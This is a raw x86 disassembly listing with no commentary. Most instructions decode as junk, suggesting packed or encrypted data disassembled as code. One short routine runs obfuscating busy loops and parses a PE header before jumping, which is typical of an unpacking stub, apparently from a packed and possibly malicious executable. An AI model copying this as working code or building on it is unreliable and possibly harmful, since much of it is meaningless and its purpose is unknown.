  4100e8:	ss aaa 
  4100ea:	ret    
  4100eb:	push   esi
  4100ec:	inc    edi
  4100ed:	data16 fmulp st(7),st
  4100f0:	loope  0x41010e
  4100f2:	cmp    eax,0xe5b99e2d
  4100f7:	push   cs
  4100f8:	jecxz  0x410179
  4100fa:	int3   
  4100fb:	mov    dh,0xf9
  4100fd:	retf   0xb0b0
  410100:	jne    0x4100f1
  410102:	push   eax
  410103:	sahf   
  410104:	adc    al,0x6d
  410106:	inc    ebp
  410107:	jne    0x4100d6
  410109:	pop    ebx
  41010a:	xchg   ebx,eax
  41010b:	xchg   edx,eax
  41010c:	ins    DWORD PTR es:[edi],dx
  41010d:	sbb    eax,0xc28d4551
  410112:	mov    bl,al
  410114:	inc    edx
  410115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410116:	cs mov ah,0x9e
  410119:	inc    ebx
  41011a:	sub    eax,0x8b08b442
  41011f:	inc    ebp
  410120:	cld    
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    esi,eax
  410136:	xchg   ecx,eax
  410137:	sbb    DWORD PTR [ebx+0x7e7e4478],0x7e7e79f4
  410141:	pop    ebp
  410142:	clc    
  410143:	mov    BYTE PTR [edi-0x7568a8b6],al
  410149:	jmp    0x4101ae
  41014b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41014c:	ja     0x410156
  41014e:	popa   
  41014f:	mov    ebp,0xbca4ae1a
  410154:	add    dh,BYTE PTR [esi]
  410156:	lahf   
  410157:	test   al,0x6d
  410159:	in     eax,dx
  41015a:	ret    0xc793
  41015d:	mov    bh,BYTE PTR ds:0x40af1a9f
  410163:	push   es
  410164:	fldcw  WORD PTR fs:[ecx+0xd]
  410168:	mov    ds:0xcd9b903,al
  41016d:	dec    ebp
  41016e:	gs jnp 0x410188
  410171:	in     al,0x71
  410173:	std    
  410174:	call   0x6246:0x4d432072
  41017b:	and    bl,BYTE PTR [ecx+0x1b]
  41017e:	aam    0xc3
  410180:	in     al,dx
  410181:	mov    esp,0xb058a210
  410186:	sbb    BYTE PTR [eax-0x49ec3721],ch
  41018c:	pop    eax
  41018d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41018e:	jbe    0x410173
  410190:	in     eax,dx
  410191:	jns    0x410181
  410193:	xor    eax,0xfb684244
  410198:	sub    bl,BYTE PTR [edx-0x33b32a64]
  41019e:	test   BYTE PTR [esi],dl
  4101a0:	out    0x39,al
  4101a2:	aas    
  4101a3:	into   
  4101a4:	pop    eax
  4101a5:	(bad)  
  4101a6:	push   esp
  4101a7:	ret    0xdd41
  4101aa:	jbe    0x41020e
  4101ac:	shl    esi,0x6e
  4101af:	sub    DWORD PTR [ebx-0xdfc2cc2],eax
  4101b5:	cmp    eax,0x89f556fa
  4101ba:	out    dx,al
  4101bb:	jb     0x41017d
  4101bd:	jle    0x410172
  4101bf:	sbb    edi,ebp
  4101c1:	add    BYTE PTR [ecx+0x6a],0xc6
  4101c5:	xor    al,0xa8
  4101c7:	push   0xab96ce01
  4101cc:	sbb    DWORD PTR ds:0xd4d47397,ebx
  4101d2:	xchg   ecx,eax
  4101d3:	push   0x3e59181c
  4101d8:	jg     0x410199
  4101da:	sbb    ebp,DWORD PTR [esi+0x4a]
  4101dd:	pushf  
  4101de:	mov    bl,0xed
  4101e0:	gs (bad) 
  4101e2:	xchg   edx,eax
  4101e3:	cmp    ecx,DWORD PTR [ebp+0x2585a8a8]
  4101e9:	mov    ebx,ebp
  4101eb:	gs pop ebx
  4101ed:	xor    DWORD PTR [ecx-0x41],edx
  4101f0:	cmc    
  4101f1:	fld    st(1)
  4101f3:	popa   
  4101f4:	dec    ebp
  4101f5:	push   eax
  4101f6:	retf   
  4101f7:	adc    BYTE PTR [eax],0xac
  4101fa:	xchg   esp,eax
  4101fb:	xor    al,0x77
  4101fd:	adc    bh,BYTE PTR [edx+0x60]
  410200:	xor    DWORD PTR [ebp+0x7a0ab90b],edi
  410206:	dec    edx
  410207:	rcl    al,0x0
  41020a:	clc    
  41020b:	cmp    al,0xef
  41020d:	mov    bl,0x83
  41020f:	call   0xe3602e35
  410214:	and    esi,DWORD PTR [edx]
  410216:	shl    DWORD PTR [edx+esi*2],0xb8
  41021a:	adc    BYTE PTR [ecx+0x2418d148],bh
  410220:	pop    edx
  410221:	or     eax,edi
  410223:	test   DWORD PTR [ecx],esi
  410225:	mov    bl,BYTE PTR [esi-0x2679b233]
  41022b:	add    BYTE PTR [ebx+0x51],cl
  41022e:	jo     0x4101f1
  410230:	pop    ecx
  410231:	test   DWORD PTR [ecx],ecx
  410233:	mov    ds:0x8722966b,al
  410238:	pusha  
  410239:	xchg   edx,eax
  41023a:	or     al,0x1e
  41023c:	mov    ss,WORD PTR [eax+0x40]
  41023f:	push   0xffffffc4
  410241:	inc    edi
  410242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410243:	xchg   cl,al
  410245:	sbb    DWORD PTR [eax+0x35904359],edx
  41024b:	dec    edx
  41024c:	ins    DWORD PTR es:[edi],dx
  41024d:	test   eax,0x14286338
  410252:	xchg   edi,eax
  410253:	test   eax,0x56435e1d
  410258:	xchg   ecx,eax
  410259:	cwde   
  41025a:	leave  
  41025b:	mov    edi,0x8b8184d3
  410260:	push   es
  410261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410262:	jmp    0x451e6e91
  410267:	retf   
  410268:	xor    BYTE PTR [ebx],dl
  41026a:	jmp    0x7596:0xe63a1584
  410271:	and    BYTE PTR [ebx],bl
  410273:	mov    eax,0x142fac94
  410278:	sub    edx,DWORD PTR [ecx-0x78d6ccb7]
  41027e:	pop    es
  41027f:	mov    ah,0xbb
  410281:	(bad)  
  410282:	mov    ebx,?
  410284:	sar    edi,0x3f
  410287:	add    ah,bl
  410289:	xchg   ecx,eax
  41028a:	sub    al,0xd9
  41028c:	sub    ch,BYTE PTR [esi]
  41028e:	(bad)  
  41028f:	and    eax,0xf0bc4977
  410294:	add    ah,BYTE PTR [edx]
  410296:	xchg   BYTE PTR [ecx+0x12],dl
  410299:	cmc    
  41029a:	loopne 0x410272
  41029c:	lods   al,BYTE PTR ds:[esi]
  41029d:	pop    eax
  41029e:	push   0xffffffb9
  4102a0:	shl    ecx,0x44
  4102a3:	lods   eax,DWORD PTR ds:[esi]
  4102a4:	xlat   BYTE PTR ds:[ebx]
  4102a5:	nop
  4102a6:	pop    eax
  4102a7:	dec    eax
  4102a8:	jmp    0x4102dc
  4102aa:	jge    0x41026a
  4102ac:	or     DWORD PTR [eax+0x34a83bbe],0xffffff9c
  4102b3:	out    0x5c,eax
  4102b5:	add    edx,DWORD PTR [ebx-0x131b5902]
  4102bb:	jle    0x410248
  4102bd:	fdivr  QWORD PTR [ebx-0x705861cf]
  4102c3:	sub    al,0xdd
  4102c5:	dec    ecx
  4102c6:	sar    esi,cl
  4102c8:	cmp    DWORD PTR [edx+0x5a74d0b7],edx
  4102ce:	ja     0x410288
  4102d0:	repz gs jo 0x4102a3
  4102d4:	ins    DWORD PTR es:[edi],dx
  4102d5:	cmp    esp,DWORD PTR [edx+0x1ba22f3]
  4102db:	xchg   esi,eax
  4102dc:	je     0x410270
  4102de:	add    cl,BYTE PTR [esi+ebx*8+0x27ee8805]
  4102e5:	mov    bl,0xa3
  4102e7:	mov    ah,0xd4
  4102e9:	dec    ebp
  4102ea:	adc    eax,0x4e18802d
  4102ef:	push   0xfadb1874
  4102f4:	xor    ecx,esi
  4102f6:	pop    edx
  4102f7:	ds retf 
  4102f9:	add    ecx,DWORD PTR [eax]
  4102fb:	mov    DWORD PTR ds:0x2525ae47,eax
  410301:	push   ebp
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	mov    WORD PTR [edx+0x7199c0c7],fs
  410309:	dec    DWORD PTR [edx]
  41030b:	push   cs
  41030c:	cmp    esi,ebx
  41030e:	push   edi
  41030f:	pop    ebp
  410310:	in     eax,0xe6
  410312:	mov    ds:0x151e6b46,eax
  410317:	mov    al,ds:0xdaf1aca3
  41031c:	ins    DWORD PTR es:[edi],dx
  41031d:	stc    
  41031e:	imul   ecx,DWORD PTR [ecx-0x30fe0c62],0xfffffff2
  410325:	pop    esp
  410326:	mov    al,0x49
  410328:	adc    DWORD PTR [esi],ebx
  41032a:	jecxz  0x4102e7
  41032c:	sub    DWORD PTR [ecx-0x8],0xdf59aa4d
  410333:	sbb    bl,BYTE PTR [edi+0xc]
  410336:	add    ah,BYTE PTR ss:[edx]
  410339:	mov    ecx,0x8d8e1e37
  41033e:	lock or eax,0x20e4792c
  410344:	ret    0xdc66
  410347:	fisttp QWORD PTR [ecx+0x29e25de7]
  41034d:	fild   WORD PTR [ecx]
  41034f:	jmp    0x4d18826f
  410354:	jb     0x41038f
  410356:	in     eax,dx
  410357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410358:	scas   eax,DWORD PTR es:[edi]
  410359:	das    
  41035a:	rep lods eax,DWORD PTR ds:[esi]
  41035c:	sbb    DWORD PTR [eax],ecx
  41035e:	fisubr WORD PTR [edx+0x36]
  410361:	leave  
  410362:	pop    es
  410363:	and    eax,0xa898faa7
  410368:	mov    eax,ds:0x7e4f463d
  41036d:	cmc    
  41036e:	(bad)  
  41036f:	adc    eax,DWORD PTR [ecx-0x5c]
  410372:	push   esi
  410373:	stc    
  410374:	mov    ecx,0x1a985432
  410379:	sbb    eax,DWORD PTR [edx+eiz*8-0x1eead015]
  410380:	or     ah,cl
  410382:	fsub   DWORD PTR [edx+0x67]
  410385:	cld    
  410386:	adc    bl,BYTE PTR ds:0x7cd8f2da
  41038c:	mov    bl,0xae
  41038e:	aad    0x72
  410390:	gs pop ebp
  410392:	retf   
  410393:	icebp  
  410394:	lock jg 0x4103ed
  410397:	bound  edi,QWORD PTR [eax]
  410399:	test   eax,0x3359f078
  41039e:	and    bl,BYTE PTR [di]
  4103a1:	jge    0x410407
  4103a3:	bound  edx,QWORD PTR [eax+0x754f7ba0]
  4103a9:	retf   0x5b7d
  4103ac:	xor    DWORD PTR [ecx+ecx*4-0x3e],edi
  4103b0:	push   edi
  4103b1:	scas   al,BYTE PTR es:[edi]
  4103b2:	xor    esp,eax
  4103b4:	or     eax,0xc15ffeaf
  4103b9:	push   ebp
  4103ba:	mov    ah,0xf8
  4103bc:	(bad)  
  4103bd:	dec    esp
  4103be:	cmp    al,al
  4103c0:	and    eax,0xa9e592fc
  4103c5:	pop    ebp
  4103c6:	dec    edx
  4103c7:	not    dh
  4103c9:	push   edx
  4103ca:	(bad)  
  4103cb:	cmp    ah,BYTE PTR [ebp+0x40ceef9e]
  4103d1:	xlat   BYTE PTR ds:[ebx]
  4103d2:	jo     0x410411
  4103d4:	lock mov edi,0x240b3577
  4103da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103db:	xor    edi,ebp
  4103dd:	and    ebp,DWORD PTR [esi-0x714ce192]
  4103e3:	or     DWORD PTR [ebx+eiz*1],eax
  4103e6:	cmp    BYTE PTR [eax-0x59973600],ah
  4103ec:	cli    
  4103ed:	mov    ecx,0xcbba3230
  4103f2:	sub    BYTE PTR [edi+0x7ed80c45],al
  4103f8:	push   ecx
  4103f9:	fwait
  4103fa:	inc    ebp
  4103fb:	(bad)  
  4103fd:	sbb    DWORD PTR [ebx-0x7b],ecx
  410400:	div    DWORD PTR [ebx]
  410402:	dec    edi
  410403:	pop    ds
  410404:	jns    0x4103bf
  410406:	js     0x41044c
  410408:	out    0x7,eax
  41040a:	mul    DWORD PTR [eax+0x41]
  41040d:	rol    BYTE PTR ds:[esi-0x6f],0x4c
  410412:	dec    ebx
  410413:	cmp    eax,ebp
  410415:	cdq    
  410416:	mov    al,ds:0x8ac27a9b
  41041b:	lock (bad) 
  41041d:	inc    dh
  41041f:	mov    ebx,?
  410421:	call   DWORD PTR [ecx+0x7586864]
  410427:	or     bl,dl
  410429:	sbb    al,0x5d
  41042b:	popf   
  41042c:	add    ch,BYTE PTR [esp+ebp*8+0x2feb6b88]
  410433:	(bad)  
  410434:	fisttp WORD PTR [esi*2-0x382b98a1]
  41043b:	jecxz  0x410445
  41043d:	icebp  
  41043e:	and    BYTE PTR [ebp+0x64],bh
  410441:	(bad)  [eax-0x33323fe3]
  410447:	fimul  DWORD PTR [ecx]
  410449:	out    0x28,eax
  41044b:	or     bh,BYTE PTR [edx-0x1]
  41044e:	leave  
  41044f:	mov    ah,0xfa
  410451:	mov    al,0x90
  410453:	dec    esp
  410454:	stc    
  410455:	test   BYTE PTR [ebx+ebx*4-0x26],bl
  410459:	add    BYTE PTR [ebx-0x35],0x7c
  41045d:	test   eax,0xa245e234
  410462:	ror    DWORD PTR [ecx],0x23
  410465:	jp     0x41044a
  410467:	aaa    
  410468:	scas   eax,DWORD PTR es:[edi]
  410469:	popf   
  41046a:	test   eax,0xec390c6a
  41046f:	pop    ebp
  410470:	push   cs
  410471:	mov    es,WORD PTR [eax]
  410473:	loopne 0x410415
  410475:	adc    al,0xc
  410477:	add    DWORD PTR [edx+0x7e291b06],ebx
  41047d:	cli    
  41047e:	loopne 0x4104c9
  410480:	mov    bh,bl
  410482:	pusha  
  410483:	ins    DWORD PTR es:[edi],dx
  410484:	push   0xf83620e0
  410489:	mov    edx,0xccac37a8
  41048e:	comiss xmm3,xmm7
  410491:	add    al,0xea
  410493:	(bad)  
  410494:	fbld   TBYTE PTR [eax+0x16]
  410497:	retf   
  410498:	mov    ds:0x271ec461,al
  41049d:	ja     0x41050d
  41049f:	jp     0x410516
  4104a1:	push   eax
  4104a2:	inc    edi
  4104a3:	inc    eax
  4104a4:	call   0x74f:0xcb0e6115
  4104ab:	mov    ebp,DWORD PTR [ecx]
  4104ad:	loope  0x410441
  4104af:	call   0xd44:0x84e23556
  4104b6:	stos   DWORD PTR es:[edi],eax
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x434477,0x1f
  4104d3:	cmp    DWORD PTR ds:0x434477,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x434477,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x434477,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x434477
  410508:	dec    eax
  410509:	mov    ds:0x434477,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x434477
  410516:	dec    eax
  410517:	mov    ds:0x434477,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x4344c7,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43450f,0x434593
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x4344cf,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434507
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x43446b,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x43446b
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x43446b,edx
  410571:	cmp    DWORD PTR ds:0x43446b,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x43446b,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x43446b,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x43446b
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x43446b,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	add    DWORD PTR [eax+0x47f6fbab],ebp
  4105f2:	jle    0x410672
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x41057a
  4105f9:	mov    dl,BYTE PTR [ebx+esi*8+0x7a]
  4105fd:	fidivr DWORD PTR [edx-0x354c3adb]
  410603:	(bad)  
  410604:	fs pop esp
  410606:	out    0xdc,eax
  410608:	push   edx
  410609:	(bad)  
  41060a:	cmp    al,0x1f
  41060c:	(bad)  
  41060d:	aam    0xf6
  41060f:	jns    0x410596
  410611:	xchg   edi,eax
  410612:	push   cs
  410613:	enter  0xf9e5,0x70
  410617:	(bad)  
  410618:	mov    edi,0xd7bb2367
  41061d:	push   ss
  41061e:	test   al,0xe
  410620:	stos   BYTE PTR es:[edi],al
  410621:	sar    DWORD PTR [ebx*2+0x5a6cb6f8],0xdf
  410629:	dec    esp
  41062a:	mov    bl,0xdc
  41062c:	arpl   WORD PTR [eax-0x4d],bx
  41062f:	or     al,0x9c
  410631:	arpl   WORD PTR [esi],si
  410633:	in     al,0x2d
  410635:	test   DWORD PTR [ebx-0x32],ebp
  410638:	mov    dl,0xb0
  41063a:	push   edi
  41063b:	jne    0x4106b6
  41063d:	and    al,0x5e
  41063f:	data16 mov dh,0xf
  410642:	lock and al,0xdf
  410645:	pop    esp
  410646:	cmp    cl,BYTE PTR [ecx+0x15]
  410649:	vcmpsd xmm6,xmm0,QWORD PTR [esi+0x46],0xa0
  41064f:	ss sar al,0x7e
  410653:	test   al,0x73
  410655:	mov    ds:0x19aa868c,eax
  41065a:	xor    al,0x75
  41065c:	sahf   
  41065d:	sub    dh,BYTE PTR [ebp-0x3bee435c]
  410663:	(bad)  
  410664:	sub    BYTE PTR [ebp-0x45602753],bh
  41066a:	and    bh,cl
  41066c:	mov    ah,0xd6
  41066e:	jg     0x410606
  410670:	or     eax,0x42bf219f
  410675:	repnz (bad) 
  410677:	adc    eax,0x399aa96e
  41067c:	shl    BYTE PTR [ecx+0x110e4ecc],1
  410682:	jl     0x4106dc
  410684:	test   BYTE PTR [ebx-0x274c7007],0xc1
  41068b:	adc    al,BYTE PTR [ebp-0x7c]
  41068e:	fdiv   st(7),st
  410690:	(bad)  
  410691:	fnstsw WORD PTR [eax+0x4d1bebdd]
  410697:	aam    0xc6
  410699:	push   ecx
  41069a:	inc    ecx
  41069b:	std    
  41069c:	inc    edx
  41069d:	fxch   st(5)
  41069f:	imul   ecx,DWORD PTR [edi+0x40],0xfffffffd
  4106a3:	cmc    
  4106a4:	or     DWORD PTR [ebx-0x526843bf],0xffffffa4
  4106ab:	leave  
  4106ac:	in     eax,0xb0
  4106ae:	pop    edx
  4106af:	pmulhw mm5,QWORD PTR [esp+edi*4]
  4106b3:	xchg   ebp,eax
  4106b4:	fdivr  DWORD PTR [esi]
  4106b6:	outs   dx,DWORD PTR ds:[esi]
  4106b7:	or     esp,DWORD PTR gs:[ecx+0x41]
  4106bb:	js     0x410669
  4106bd:	cli    
  4106be:	jne    0x410728
  4106c0:	xchg   bl,dl
  4106c2:	imul   ebx,esi,0xa876a975
  4106c8:	arpl   WORD PTR [ebx],dx
  4106ca:	xchg   ecx,eax
  4106cb:	iret   
  4106cc:	ins    BYTE PTR es:[edi],dx
  4106cd:	je     0x410719
  4106cf:	sahf   
  4106d0:	nop
  4106d1:	xchg   edi,eax
  4106d2:	mov    eax,ds:0x5f517c63
  4106d7:	ins    BYTE PTR es:[edi],dx
  4106d8:	aad    0xbf
  4106da:	fdivr  DWORD PTR [edx+0x1f]
  4106dd:	mov    bl,0x7b
  4106df:	push   cs
  4106e0:	pop    esp
  4106e1:	std    
  4106e2:	or     DWORD PTR [edx],0xffffffb8
  4106e5:	xchg   ebp,eax
  4106e6:	xor    BYTE PTR gs:[edx+eax*1],0xce
  4106eb:	or     DWORD PTR [edx+0x501f444d],0xe8f46c7f
  4106f5:	mov    ah,0xc9
  4106f7:	icebp  
  4106f8:	(bad)  
  4106f9:	push   ebp
  4106fa:	ret    0xb40d
  4106fd:	mov    al,BYTE PTR [edx+0x21f2bd1e]
  410703:	mov    eax,ds:0x471db059
  410708:	scas   al,BYTE PTR es:[edi]
  410709:	push   ebx
  41070a:	clc    
  41070b:	sbb    eax,0x3abe884f
  410710:	add    ah,BYTE PTR [esi-0x2197e3f]
  410716:	xchg   ebx,eax
  410717:	xor    esp,DWORD PTR ds:0xe96ad4c4
  41071d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41071e:	sub    ebp,eax
  410720:	inc    eax
  410721:	jbe    0x410716
  410723:	inc    ebx
  410724:	test   BYTE PTR [ecx],dl
  410726:	leave  
  410727:	test   DWORD PTR [edi+ebx*8],edx
  41072a:	ret    0xf8bc
  41072d:	xchg   esp,eax
  41072e:	(bad)  
  41072f:	jmp    0xe5f6:0x11b9245b
  410736:	xchg   ecx,eax
  410737:	push   edx
  410738:	into   
  410739:	inc    ebx
  41073a:	(bad)  
  41073b:	mov    gs,WORD PTR [eax+ebp*2-0x1a]
  41073f:	ss (bad) 
  410742:	jmp    0xa171ca4b
  410747:	arpl   bp,ax
  410749:	(bad)  
  41074a:	cli    
  41074b:	pop    ecx
  41074c:	inc    ebp
  41074d:	sub    BYTE PTR [bp+0x2da0],0x74
  410753:	lods   al,BYTE PTR ds:[esi]
  410754:	mov    esp,0x6b7009a4
  410759:	(bad)  
  41075a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41075b:	and    edi,esi
  41075d:	jl     0x4106f3
  41075f:	dec    esp
  410760:	psrlw  mm0,mm3
  410763:	(bad)  
  410764:	pop    edx
  410765:	mov    ?,eax
  410767:	cwde   
  410768:	icebp  
  410769:	out    dx,al
  41076a:	or     eax,esi
  41076c:	(bad)  
  41076d:	cmp    bl,BYTE PTR [esi]
  41076f:	xchg   esp,eax
  410770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410771:	pop    es
  410772:	push   edi
  410773:	cmp    eax,0x955c9899
  410778:	aam    0xb2
  41077a:	fsubr  st(1),st
  41077c:	adc    ch,0xed
  41077f:	dec    esp
  410780:	inc    ecx
  410781:	add    DWORD PTR [esi],edx
  410783:	fbld   TBYTE PTR [ebp+eiz*2+0x2df22684]
  41078a:	xor    DWORD PTR [ecx],edi
  41078c:	jmp    0x410749
  41078e:	in     al,0x78
  410790:	stos   BYTE PTR es:[edi],al
  410791:	xchg   ecx,eax
  410792:	in     eax,dx
  410793:	call   0xb908:0x758b2ab4
  41079a:	cdq    
  41079b:	jb     0x4107cf
  41079d:	add    cl,ch
  41079f:	mov    dh,0x1
  4107a1:	add    BYTE PTR [eax],al
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	inc    edx
  4107b0:	xchg   esi,eax
  4107b1:	sbb    BYTE PTR [edi+0x7e7e4114],0x9c
  4107b8:	jg     0x410838
  4107ba:	jle    0x41076b
  4107bc:	inc    ecx
  4107bd:	fdiv   DWORD PTR [esi+esi*1]
  4107c0:	retf   
  4107c1:	clc    
  4107c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c3:	cmp    al,0x74
  4107c5:	jecxz  0x4107ff
  4107c7:	mov    ah,0xb1
  4107c9:	sub    DWORD PTR [ebp+0x22],esp
  4107cc:	mov    ebp,0xa0547426
  4107d1:	ins    BYTE PTR es:[edi],dx
  4107d2:	gs dec eax
  4107d4:	ret    
  4107d5:	in     al,dx
  4107d6:	or     BYTE PTR [esi+0x3ed3322],0xd
  4107dd:	push   cs
  4107de:	sub    DWORD PTR [ebp-0x11],esp
  4107e1:	cmp    bl,ah
  4107e3:	stc    
  4107e4:	xchg   BYTE PTR [ecx-0x3],dh
  4107e7:	xor    DWORD PTR [ecx+0x4654d136],0xa3c141d3
  4107f1:	gs or  dh,cl
  4107f4:	mov    cl,BYTE PTR ds:0xe88584a2
  4107fa:	sbb    al,0xf9
  4107fc:	jecxz  0x41083d
  4107fe:	outs   dx,DWORD PTR ds:[esi]
  4107ff:	stos   BYTE PTR es:[edi],al
  410800:	jne    0x41081f
  410802:	and    BYTE PTR [ecx],dl
  410804:	push   ds
  410805:	and    ecx,DWORD PTR [esi]
  410807:	xor    al,0xe9
  410809:	push   0xfffffff4
  41080b:	pop    edi
  41080c:	into   
  41080d:	adc    eax,0x9f8d0033
  410812:	retf   0xc23d
  410815:	sub    edx,DWORD PTR [ebp+0x605f990b]
  41081b:	cs adc eax,0x6e2e00b3
  410821:	data16 xchg BYTE PTR [eax+0x53352af7],ch
  410828:	into   
  410829:	fadd   DWORD PTR [ecx+0x51]
  41082c:	jmp    0xb621:0xa53d6996
  410833:	rcl    BYTE PTR [ecx],0x7c
  410836:	adc    cl,dl
  410838:	cmp    eax,0x3ccd6c57
  41083d:	xchg   BYTE PTR [eax],ch
  41083f:	and    DWORD PTR [eax+0x57],eax
  410842:	(bad)  
  410843:	xchg   esp,eax
  410844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410845:	cmp    ah,al
  410847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410848:	mov    esi,0x8868eb4
  41084d:	iret   
  41084e:	adc    DWORD PTR [edi+0x10],esi
  410851:	stos   DWORD PTR es:[edi],eax
  410852:	scas   al,BYTE PTR es:[edi]
  410853:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  410855:	loop   0x410804
  410857:	inc    eax
  410858:	or     edi,DWORD PTR [eax]
  41085a:	inc    edi
  41085b:	out    0x7e,eax
  41085d:	pop    edx
  41085e:	in     al,dx
  41085f:	mov    edx,?
  410861:	cmc    
  410862:	cmp    bl,0x8f
  410865:	add    ebp,DWORD PTR [edx+0x21]
  410868:	js     0x410875
  41086a:	jb     0x410857
  41086c:	ins    BYTE PTR es:[edi],dx
  41086d:	inc    edx
  41086e:	out    dx,eax
  41086f:	test   al,0x19
  410871:	imul   esi,DWORD PTR [eax-0xf],0xe59fe89d
  410878:	push   0x31
  41087a:	sahf   
  41087b:	aaa    
  41087c:	lea    eax,[edi+0x32]
  41087f:	xor    dh,BYTE PTR [ebx]
  410881:	fldl2e 
  410883:	pusha  
  410884:	xchg   edi,eax
  410885:	(bad)  
  410886:	and    DWORD PTR [ecx-0xa08addf],ecx
  41088c:	data16 or al,0xc4
  41088f:	leave  
  410890:	push   0xffffff93
  410892:	push   esp
  410893:	jno    0x4108d6
  410895:	mov    ds:0x3b8c8558,al
  41089a:	imul   ebx,DWORD PTR ds:0x7c51ccd3,0x5a
  4108a1:	mov    bl,0x50
  4108a3:	and    DWORD PTR [edx],esi
  4108a5:	jae    0x410870
  4108a7:	xor    BYTE PTR [edi+0x31b50d67],cl
  4108ad:	adc    edx,esp
  4108af:	(bad)  
  4108b0:	sub    edi,DWORD PTR [esi+ebx*4-0xf3eb36a]
  4108b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b8:	push   ecx
  4108b9:	jle    0x410854
  4108bb:	xor    eax,DWORD PTR [ebp+0x20]
  4108be:	mov    ds:0x419cb653,al
  4108c3:	jl     0x41086a
  4108c5:	xchg   esi,eax
  4108c6:	stos   DWORD PTR es:[edi],eax
  4108c7:	xor    DWORD PTR [eax+ebp*4+0x2614bd67],esp
  4108ce:	pop    eax
  4108cf:	out    0x4c,al
  4108d1:	out    0xa7,al
  4108d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d4:	out    dx,al
  4108d5:	out    0x6,eax
  4108d7:	cmp    eax,0xb89e184c
  4108dc:	lods   eax,DWORD PTR ds:[esi]
  4108dd:	jg     0x410948
  4108df:	mov    edx,0x266cd73a
  4108e4:	cmp    DWORD PTR [edi],esi
  4108e6:	cmp    DWORD PTR [eax],esp
  4108e8:	push   esp
  4108e9:	adc    al,0x98
  4108eb:	adc    DWORD PTR [edx],0x1c85e5ff
  4108f1:	data16 add ah,BYTE PTR [ecx-0x5a051822]
  4108f8:	retf   0xb469
  4108fb:	inc    ecx
  4108fc:	or     dl,BYTE PTR [ebp+0xe]
  4108ff:	pop    es
  410900:	pushf  
  410901:	test   al,0x90
  410903:	jnp    0x410936
  410905:	mov    edx,0x16e57a3a
  41090a:	out    dx,eax
  41090b:	pop    edx
  41090c:	push   esi
  41090d:	inc    ebp
  41090e:	mov    ds:0x28e9dc22,al
  410913:	add    DWORD PTR [ecx+0x5f],esi
  410916:	xchg   ecx,eax
  410917:	std    
  410918:	and    dl,bl
  41091a:	fs jnp 0x4108eb
  41091d:	jmp    0x8c68e7a1
  410922:	adc    DWORD PTR [ebx-0x47],ecx
